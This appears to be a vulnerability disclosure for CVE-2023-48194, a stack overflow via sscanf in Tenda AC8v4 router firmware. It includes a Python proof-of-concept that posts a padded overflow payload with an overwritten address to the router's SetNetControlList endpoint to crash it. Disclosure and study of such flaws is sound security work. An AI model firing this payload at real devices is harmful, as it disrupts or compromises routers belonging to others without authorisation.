# CVE-2023-48194
## Overview

Firmware download website:

https://www.tenda.com.cn/download/detail-3683.html

https://down.tenda.com.cn/uploadfile/AC8/V16.03.34.09.zip

https://static.tenda.com.cn/tdcweb/download/uploadfile/AC8/V16.03.34.09.zip

## Affected version

AC8/V16.03.34.09

## Vulnerability details

Tenda AC8v4 .V16.03.34.09. Due to sscanf, the last digit of s8 is overwritten with \x0. After executing set_client_qos, control over the gp register is obtained

![image-20231110220324578](./assets/image-20231110220324578-1720273401785-36.png)

![image-20231111010734363](./assets/image-20231111010734363-1720273369808-31.png)

![image-20231110211938397](./assets/image-20231110211938397-1720273369809-32.png)

## PoC

a poc to make it `Segmentation fault (core dumped)`

```
import requests
url = 'http://192.168.0.1/goform/SetNetControlList'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'close',
    'Content-Length': '3003'
}
payload=b"list="

pad=0x407ff818-0x407ff7c0
from pwn import *
target=0x40302010
target=p32(target)
payload+=b"a"*(pad)+target+b"c"*(0x110-pad)
# list len >=0x100
try:
    requests.post(url, headers=headers, data=payload,timeout=3)
except requests.exceptions.ReadTimeout:
    print("test ok")
```

![image-20240706214512012](./assets/image-20240706214512012.png)

before sscanf

![image-20231110215023268](./assets/image-20231110215023268-1720273237248-10.png)

after,and will ret

![image-20231110215635663](./assets/image-20231110215635663-1720273237247-6.png)

![image-20231110222010134](./assets/image-20231110222010134-1720273237248-8.png)

![image-20231110222523163](./assets/image-20231110222523163-1720273237248-9.png)

